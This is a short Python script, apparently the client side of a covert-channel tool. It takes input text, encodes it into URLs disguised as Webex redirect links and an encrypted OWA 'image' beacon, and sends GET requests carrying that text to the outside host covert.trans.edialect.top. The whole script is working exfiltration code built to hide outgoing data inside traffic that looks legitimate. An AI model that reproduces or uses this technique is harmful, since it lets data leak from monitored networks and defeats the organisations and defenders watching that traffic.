

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))
from app.redirect import generate_string_pair
from app.owa import encrypt_aes
from app.owa import KEY as OWA_KEY
from typing import List
import requests


WEBEX_URL_FORMAT = 'https://covert.trans.edialect.top/redirect/redirect/s={}&messageId=1111111'
OWA_URL_FORMAT = 'https://covert.trans.edialect.top/backend/image?jwt={}'
# WEBEX_URL_FORMAT = 'https://10.112.175.237:86/redirect/redirect/s={}&messageId=1111111'
# OWA_URL_FORMAT = 'https://10.112.175.237:86/backend/image?jwt={}'
# WEBEX_URL_FORMAT = 'https://127.0.0.1:86/redirect/redirect/s={}&messageId=1111111'
# OWA_URL_FORMAT = 'https://127.0.0.1:86/backend/image?jwt={}'


text = input("input text: ")


s1, s2 = generate_string_pair(text)
s1 = WEBEX_URL_FORMAT.format(s1)
s2 = WEBEX_URL_FORMAT.format(s2)
s_beacon = encrypt_aes(text, OWA_KEY).hex()
s_beacon = OWA_URL_FORMAT.format(s_beacon)

print(s1)
print(s2)
print(s_beacon)

requests.get(s1)
requests.get(s2)
requests.get(s_beacon)